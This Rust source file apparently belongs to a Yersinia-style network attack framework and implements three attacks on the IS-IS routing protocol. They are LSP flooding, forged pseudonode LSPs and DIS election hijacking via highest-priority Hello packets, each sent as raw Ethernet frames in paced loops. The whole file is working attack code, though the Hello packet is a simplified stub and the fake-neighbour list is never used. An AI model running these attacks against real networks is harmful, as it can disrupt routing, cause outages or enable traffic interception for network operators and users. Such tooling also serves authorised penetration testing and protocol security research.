//! IS-IS Attack Implementations

use super::packet::{IsisLsp, IsisPacket};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// IS-IS LSP Flooding Attack
#[derive(Debug, Clone)]
pub struct IsisLspFloodingAttack {
    pub level: u8,
    pub system_id: [u8; 6],
    pub rate_pps: u32,
    pub num_lsps: u32,
}

impl IsisLspFloodingAttack {
    pub fn new(level: u8, system_id: [u8; 6]) -> Self {
        Self {
            level,
            system_id,
            rate_pps: 100,
            num_lsps: 1000,
        }
    }

    pub fn build_lsp(&self, index: u32) -> IsisPacket {
        let mut lsp_id = [0u8; 8];
        lsp_id[..6].copy_from_slice(&self.system_id);
        lsp_id[6] = (index & 0xFF) as u8;
        lsp_id[7] = 0;

        let lsp = IsisLsp::new(self.level, lsp_id).with_sequence(0x80000001 + index);

        IsisPacket::lsp(lsp)
    }
}

/// IS-IS Pseudonode Manipulation Attack
#[derive(Debug, Clone)]
pub struct IsisPseudonodeManipulationAttack {
    pub level: u8,
    pub designated_is: [u8; 6],
    pub fake_neighbors: Vec<[u8; 6]>,
}

impl IsisPseudonodeManipulationAttack {
    pub fn new(level: u8, designated_is: [u8; 6]) -> Self {
        Self {
            level,
            designated_is,
            fake_neighbors: vec![],
        }
    }

    pub fn build_pseudonode_lsp(&self) -> IsisPacket {
        let mut lsp_id = [0u8; 8];
        lsp_id[..6].copy_from_slice(&self.designated_is);
        lsp_id[6] = 0x01; // Pseudonode number
        lsp_id[7] = 0;

        let lsp = IsisLsp::new(self.level, lsp_id).with_sequence(0x80000001);

        IsisPacket::lsp(lsp)
    }
}

/// IS-IS DIS Election Attack
#[derive(Debug, Clone)]
pub struct IsisDisElectionAttack {
    pub level: u8,
    pub attacker_system_id: [u8; 6],
    pub priority: u8,
}

impl IsisDisElectionAttack {
    pub fn new(level: u8, system_id: [u8; 6]) -> Self {
        Self {
            level,
            attacker_system_id: system_id,
            priority: 127, // Highest priority
        }
    }

    pub fn build_hello(&self) -> Vec<u8> {
        // Simplified Hello packet for DIS election
        vec![
            0x83,
            27,
            1,
            0,
            if self.level == 1 { 15 } else { 16 },
            1,
            0,
            0,
        ]
    }
}

#[async_trait]
impl Attack for IsisLspFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        for i in 0..self.num_lsps {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let isis_bytes = self.build_lsp(i).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x09, 0x00, 0x2B, 0x00, 0x00, 0x05]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::LLC,
                isis_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IS-IS LSP Flooding"
    }
}

#[async_trait]
impl Attack for IsisPseudonodeManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(1);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let isis_bytes = self.build_pseudonode_lsp().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x09, 0x00, 0x2B, 0x00, 0x00, 0x05]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::LLC,
                isis_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IS-IS Pseudonode Manipulation"
    }
}

#[async_trait]
impl Attack for IsisDisElectionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(500);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let isis_bytes = self.build_hello();
            let frame = EthernetFrame::new(
                MacAddress([0x09, 0x00, 0x2B, 0x00, 0x00, 0x05]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::LLC,
                isis_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IS-IS DIS Election"
    }
}
